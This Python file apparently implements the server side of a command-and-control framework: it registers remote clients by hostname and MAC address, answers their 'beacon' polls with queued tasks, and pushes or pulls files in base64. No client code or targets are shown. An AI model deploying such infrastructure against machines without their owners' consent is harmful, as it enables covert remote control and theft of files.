import uuid
import base64
from collections import deque
from threading import Lock, Condition

class Server:
    def __init__(self):
        self.clients = {}
        self.task_meta = {}
        self.lock = Lock()
        self.condition = Condition(self.lock)
 
    def identify(self, hostname, mac):
        client_id = str(uuid.uuid4())

        with self.lock:
            self.clients[client_id] = {
                "hostname": hostname,
                "mac": mac,
                "tasks": deque  (),
                "results": {}
            }

        print(f"[+] connected {hostname} ({client_id})")

        return {"status": "ok", "client_id": client_id}

    def beacon(self, client_id, timeout=60):
        with self.condition:
            client = self.get_client(client_id)

            if not client["tasks"]:
                self.condition.wait(timeout)

            task = client["tasks"].popleft() if client["tasks"] else None

        return {"task": task}
    
    def upload_file(self, client_id, local_path, remote_path):
        with open(local_path, "rb") as f:
            data = base64.b64encode(f.read()).decode()
            
        self.send_task(client_id, "upload", {
            "path": remote_path,
            "data": data
        })
    
    def download_file(self, client_id, remote_path, local_path):
        self.send_task(client_id, "download",
            params = {"path": remote_path},
            meta = {"local_path": local_path}
        )

    def enqueue(self, client_id, task):
        with self.condition:
            client = self.get_client(client_id)
            client["tasks"].append(task)

            self.condition.notify_all()

    def get_client(self, client_id):
        client = self.clients.get(client_id)

        if not client:
            raise Exception("unknown client")

        return client
 
    def create_task(self, method, params=None):
        return {
            "id": str(uuid.uuid4()),
            "type": "action",
            "method": method,
            "params": params or {}
        }

    def send_task(self, client_id, method, params=None, meta=None):
        task = self.create_task(method, params)
        if meta:
            self.task_meta[task["id"]] = meta
        try:
            self.enqueue(client_id, task)
        except Exception:
            print("unknown client")
    
    def task_result(self, client_id, task_id, result):
        with self.lock:
            client = self.get_client(client_id)
            client["results"][task_id] = result
        
        out = result["output"]
        status = result["status"]
        host = self.clients[client_id]["hostname"]
        meta = self.task_meta.pop(task_id, None)

        print(f"[{host}] {status}")

        if meta and status == "ok":
            with open(meta["local_path"], "wb") as f:
                f.write(base64.b64decode(out["stdout"]))
            print(f" saved to {meta['local_path']}")
            return

        output = out["stdout"] if status == "ok" else out["stderr"]
        if output:
            print(f" {output}")